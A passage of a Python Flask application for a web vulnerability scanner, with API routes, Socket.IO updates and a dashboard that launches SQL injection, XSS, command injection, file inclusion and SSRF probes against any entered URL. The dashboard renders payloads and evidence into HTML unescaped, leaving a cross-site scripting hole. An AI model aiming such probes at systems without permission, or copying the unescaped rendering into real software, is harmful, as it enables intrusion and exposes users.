            """Get payloads for vulnerability type"""
            try:
                payloads = self.payload_db.get_payloads(vuln_type)
                return jsonify({
                    'vulnerability_type': vuln_type,
                    'payloads': payloads[:20],  # Limit for API response
                    'total_count': len(payloads)
                })
                
            except Exception as e:
                logger.error(f"Payload retrieval error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/statistics')
        def get_statistics():
            """Get scanner statistics"""
            try:
                stats = self.orchestration_engine.get_scan_statistics()
                return jsonify(stats)
                
            except Exception as e:
                logger.error(f"Statistics error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/vulnerabilities/test', methods=['POST'])
        @self.limiter.limit('10/minute')
        def test_single_vulnerability():
            """Test single vulnerability endpoint"""
            try:
                test_config = request.get_json()
                
                required_fields = ['target_url', 'parameter', 'vulnerability_type', 'payload']
                if not all(field in test_config for field in required_fields):
                    return jsonify({'error': 'Missing required fields'}), 400
                
                # Perform single vulnerability test
                result = asyncio.run(self._test_single_vulnerability(test_config))
                
                return jsonify(result)
                
            except Exception as e:
                logger.error(f"Single vulnerability test error: {e}")
                return jsonify({'error': str(e)}), 500
    
    def _setup_websocket_events(self):
        """Setup WebSocket events for real-time updates"""
        
        @self.socketio.on('connect')
        def handle_connect():
            """Handle client connection"""
            logger.info(f"Client connected: {request.sid}")
            emit('connected', {'message': 'Connected to Enterprise Scanner'})
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            """Handle client disconnection"""
            logger.info(f"Client disconnected: {request.sid}")
        
        @self.socketio.on('subscribe_scan')
        def handle_scan_subscription(data):
            """Subscribe to scan updates"""
            scan_id = data.get('scan_id')
            if scan_id:
                join_room(f"scan_{scan_id}")
                emit('subscribed', {'scan_id': scan_id, 'message': 'Subscribed to scan updates'})
        
        @self.socketio.on('unsubscribe_scan')
        def handle_scan_unsubscription(data):
            """Unsubscribe from scan updates"""
            scan_id = data.get('scan_id')
            if scan_id:
                leave_room(f"scan_{scan_id}")
                emit('unsubscribed', {'scan_id': scan_id, 'message': 'Unsubscribed from scan updates'})
    
    async def _test_single_vulnerability(self, test_config: Dict) -> Dict:
        """Test single vulnerability for API endpoint"""
        try:
            target_url = test_config['target_url']
            parameter = test_config['parameter']
            vuln_type = test_config['vulnerability_type']
            payload = test_config['payload']
            
            # Create vulnerability result
            if vuln_type == 'sql_injection':
                results = await self.detection_engine.detect_sql_injection(target_url, parameter, [payload])
            elif vuln_type == 'xss':
                results = await self.detection_engine.detect_xss(target_url, parameter, [payload])
            elif vuln_type == 'command_injection':
                results = await self.detection_engine.detect_command_injection(target_url, parameter, [payload])
            elif vuln_type == 'file_inclusion':
                results = await self.detection_engine.detect_file_inclusion(target_url, parameter, [payload])
            elif vuln_type == 'ssrf':
                results = await self.detection_engine.detect_ssrf(target_url, parameter, [payload])
            else:
                return {'error': f'Unsupported vulnerability type: {vuln_type}'}
            
            # Return first result or indicate no vulnerability found
            if results:
                result = results[0]
                return {
                    'vulnerability_found': True,
                    'vulnerability': result.to_dict(),
                    'confidence': result.confidence,
                    'evidence': result.evidence
                }
            else:
                return {
                    'vulnerability_found': False,
                    'message': 'No vulnerability detected with the provided payload'
                }
                
        except Exception as e:
            logger.error(f"Single vulnerability test error: {e}")
            return {'error': str(e)}
    
    def emit_scan_update(self, scan_id: str, update_data: Dict):
        """Emit scan update via WebSocket"""
        try:
            self.socketio.emit('scan_update', update_data, room=f"scan_{scan_id}")
        except Exception as e:
            logger.error(f"Failed to emit scan update: {e}")
    
    def run(self, host: str = '0.0.0.0', port: int = 3000, debug: bool = False):
        """Run the enterprise scanner"""
        logger.info(f"🚀 Starting Enterprise Security Scanner on {host}:{port}")
        logger.info("🔧 Features enabled:")
        logger.info("   ✅ Advanced Vulnerability Detection")
        logger.info("   ✅ AI/ML Analysis Engine")
        logger.info("   ✅ Computer Vision Analysis")
        logger.info("   ✅ Advanced Threading & Connection Pooling")
        logger.info("   ✅ Real-time Response Analysis")
        logger.info("   ✅ Comprehensive Payload Database")
        logger.info("   ✅ WebSocket Real-time Updates")
        logger.info("   ✅ Enterprise Security Features")
        
        self.socketio.run(
            self.app,
            host=host,
            port=port,
            debug=debug,
            use_reloader=False,
            log_output=True
        )

# Dashboard HTML Template
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🏆 Enterprise Security Scanner 2025</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 3em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            transition: transform 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        .card h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        
        .scan-form {
            grid-column: 1 / -1;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #555;
        }
        
        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e1e1;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 15px;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .status {
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            font-weight: 600;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        .progress {
            width: 100%;
            height: 20px;
            background: #e1e1e1;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: width 0.3s ease;
            border-radius: 10px;
        }
        
        .results {
            margin-top: 20px;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .vulnerability {
            background: #f8f9fa;
            border-left: 4px solid #dc3545;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
        }
        
        .vulnerability.high {
            border-left-color: #dc3545;
        }
        
        .vulnerability.medium {
            border-left-color: #ffc107;
        }
        
        .vulnerability.low {
            border-left-color: #28a745;
        }
        
        .vulnerability h4 {
            margin-bottom: 10px;
            color: #dc3545;
        }
        
        .vulnerability .meta {
            font-size: 0.9em;
            color: #666;
            margin-bottom: 10px;
        }
        
        .vulnerability .evidence {
            background: white;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;
            border: 1px solid #e1e1e1;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .stat-item {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏆 Enterprise Security Scanner 2025</h1>
            <p>Complete Vulnerability Assessment | AI-Powered | Real-time Analysis</p>
        </div>
        
        <div class="dashboard">
            <div class="card scan-form">
                <h3>🎯 Start Comprehensive Scan</h3>
                <form id="scanForm">
                    <div class="form-group">
                        <label for="targetUrl">Target URL *</label>
                        <input type="url" id="targetUrl" name="target_url" placeholder="https://example.com" required>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="scanTypes">Scan Types</label>
                            <select id="scanTypes" name="scan_types" multiple>
                                <option value="all" selected>All Vulnerabilities</option>
                                <option value="sql_injection">SQL Injection</option>
                                <option value="xss">Cross-Site Scripting</option>
                                <option value="command_injection">Command Injection</option>
                                <option value="file_inclusion">File Inclusion</option>
                                <option value="ssrf">Server-Side Request Forgery</option>
                                <option value="auth_bypass">Authentication Bypass</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label for="maxThreads">Max Threads</label>
                            <input type="number" id="maxThreads" name="max_threads" value="50" min="1" max="200">
                        </div>
                        
                        <div class="form-group">
                            <label for="depth">Scan Depth</label>
                            <input type="number" id="depth" name="depth" value="2" min="1" max="5">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="parameters">Custom Parameters (comma-separated)</label>
                        <input type="text" id="parameters" name="parameters" placeholder="id,page,file,url,search">
                    </div>
                    
                    <button type="submit" class="btn" id="startScanBtn">🚀 Start Comprehensive Scan</button>
                </form>
                
                <div id="scanStatus" style="display: none;">
                    <div class="status info">
                        <strong>Scan Status:</strong> <span id="statusText">Starting...</span>
                    </div>
                    <div class="progress">
                        <div class="progress-bar" id="progressBar" style="width: 0%"></div>
                    </div>
                    <div id="scanDetails"></div>
                </div>
                
                <div id="scanResults" class="results" style="display: none;">
                    <h3>🔍 Vulnerability Results</h3>
                    <div id="vulnerabilityList"></div>
                </div>
            </div>
            
            <div class="card">
                <h3>📊 Scanner Statistics</h3>
                <div id="statistics">
                    <div class="stats">
                        <div class="stat-item">
                            <div class="stat-number" id="totalScans">0</div>
                            <div class="stat-label">Total Scans</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number" id="totalVulns">0</div>
                            <div class="stat-label">Vulnerabilities Found</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number" id="activeScans">0</div>
                            <div class="stat-label">Active Scans</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="card">
                <h3>⚡ System Status</h3>
                <div id="systemStatus">
                    <div class="status info">Checking system health...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Initialize Socket.IO connection
        const socket = io();
        let currentScanId = null;
        
        // Socket event handlers
        socket.on('connect', function() {
            console.log('Connected to Enterprise Scanner');
            updateSystemStatus('Connected to scanner', 'success');
            loadStatistics();
        });
        
        socket.on('disconnect', function() {
            console.log('Disconnected from scanner');
            updateSystemStatus('Disconnected from scanner', 'error');
        });
        
        socket.on('scan_update', function(data) {
            updateScanStatus(data);
        });
        
        // Form submission
        $('#scanForm').on('submit', function(e) {
            e.preventDefault();
            startScan();
        });
        
        function startScan() {
            const formData = {
                target_url: $('#targetUrl').val(),
                scan_types: $('#scanTypes').val() || ['all'],
                max_threads: parseInt($('#maxThreads').val()) || 50,
                depth: parseInt($('#depth').val()) || 2,
                parameters: $('#parameters').val().split(',').map(p => p.trim()).filter(p => p)
            };
            
            $('#startScanBtn').prop('disabled', true).text('🔄 Starting Scan...');
            $('#scanStatus').show();
            $('#scanResults').hide();
            
            $.ajax({
                url: '/api/scan/start',
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(formData),
                success: function(response) {
                    currentScanId = response.scan_id;
                    socket.emit('subscribe_scan', {scan_id: currentScanId});
                    
                    updateScanStatus({
                        status: 'running',
                        message: 'Scan started successfully',
                        scan_id: currentScanId
                    });
                    
                    // Poll for status updates
                    pollScanStatus();
                },
                error: function(xhr) {
                    const error = xhr.responseJSON?.error || 'Failed to start scan';
                    updateSystemStatus(error, 'error');
                    $('#startScanBtn').prop('disabled', false).text('🚀 Start Comprehensive Scan');
                    $('#scanStatus').hide();
                }
            });
        }
        
        function pollScanStatus() {
            if (!currentScanId) return;
            
            $.get(`/api/scan/${currentScanId}/status`)
                .done(function(data) {
                    updateScanStatus(data);
                    
                    if (data.status === 'running') {
                        setTimeout(pollScanStatus, 2000); // Poll every 2 seconds
                    } else if (data.status === 'completed') {
                        loadScanResults();
                        $('#startScanBtn').prop('disabled', false).text('🚀 Start Comprehensive Scan');
                        loadStatistics();
                    } else if (data.status === 'failed') {
                        updateSystemStatus(data.error || 'Scan failed', 'error');
                        $('#startScanBtn').prop('disabled', false).text('🚀 Start Comprehensive Scan');
                    }
                })
                .fail(function() {
                    setTimeout(pollScanStatus, 5000); // Retry after 5 seconds
                });
        }
        
        function updateScanStatus(data) {
            $('#statusText').text(data.status || 'Unknown');
            
            let progress = 0;
            switch(data.status) {
                case 'starting': progress = 10; break;
                case 'running': progress = 50; break;
                case 'completed': progress = 100; break;
                case 'failed': progress = 0; break;
            }
            
            $('#progressBar').css('width', progress + '%');
            
            if (data.vulnerabilities_found !== undefined) {
                $('#scanDetails').html(`
                    <div class="status info">
                        <strong>Vulnerabilities Found:</strong> ${data.vulnerabilities_found}<br>
                        <strong>Scan ID:</strong> ${data.scan_id || currentScanId}
                    </div>
                `);
            }
        }
        
        function loadScanResults() {
            if (!currentScanId) return;
            
            $.get(`/api/scan/${currentScanId}/report`)
                .done(function(report) {
                    displayResults(report);
                    $('#scanResults').show();
                })
                .fail(function() {
                    updateSystemStatus('Failed to load scan results', 'error');
                });
        }
        
        function displayResults(report) {
            const vulnerabilities = report.vulnerabilities || [];
            let html = '';
            
            if (vulnerabilities.length === 0) {
                html = '<div class="status success">No vulnerabilities found! 🎉</div>';
            } else {
                vulnerabilities.forEach(vuln => {
                    const severity = vuln.severity || 'medium';
                    html += `
                        <div class="vulnerability ${severity}">
                            <h4>${vuln.vulnerability_type.replace('_', ' ').toUpperCase()} - ${vuln.subtype || 'General'}</h4>
                            <div class="meta">
                                <strong>Confidence:</strong> ${(vuln.confidence * 100).toFixed(1)}% | 
                                <strong>Risk Score:</strong> ${(vuln.risk_score * 100).toFixed(1)}% | 
                                <strong>Parameter:</strong> ${vuln.parameter} |
                                <strong>Method:</strong> ${vuln.detection_method}
                            </div>
                            <div class="evidence">
                                <strong>Evidence:</strong> ${vuln.evidence}<br>
                                <strong>Payload:</strong> ${vuln.payload}<br>
                                <strong>Remediation:</strong> ${vuln.remediation}
                            </div>
                        </div>
                    `;
                });
            }
            
            $('#vulnerabilityList').html(html);
        }
        
        function loadStatistics() {
            $.get('/api/statistics')
                .done(function(stats) {
                    $('#totalScans').text(stats.completed_scans || 0);
                    $('#totalVulns').text(stats.total_vulnerabilities || 0);
                    $('#activeScans').text(Object.keys(stats.active_scans || {}).length);
                })
                .fail(function() {
                    console.log('Failed to load statistics');
                });
        }
        
        function updateSystemStatus(message, type) {
            const statusClass = type === 'success' ? 'success' : type === 'error' ? 'error' : 'info';
            $('#systemStatus').html(`<div class="status ${statusClass}">${message}</div>`);
        }
        
        // Load initial data
        $(document).ready(function() {
            // Check health
            $.get('/api/health')
                .done(function(health) {
                    updateSystemStatus(`System healthy - ${health.version}`, 'success');
                })
                .fail(function() {
                    updateSystemStatus('System health check failed', 'error');
                });
            
            loadStatistics();
            
            // Set up periodic statistics refresh
            setInterval(loadStatistics, 30000); // Every 30 seconds
        });
    </script>
</body>
</html>
"""

# Main execution
if __name__ == '__main__':
    # Create enterprise scanner instance
    scanner = EnterpriseSecurityScanner()
    
    # Run the scanner
    scanner.run(host='0.0.0.0', port=3000, debug=False)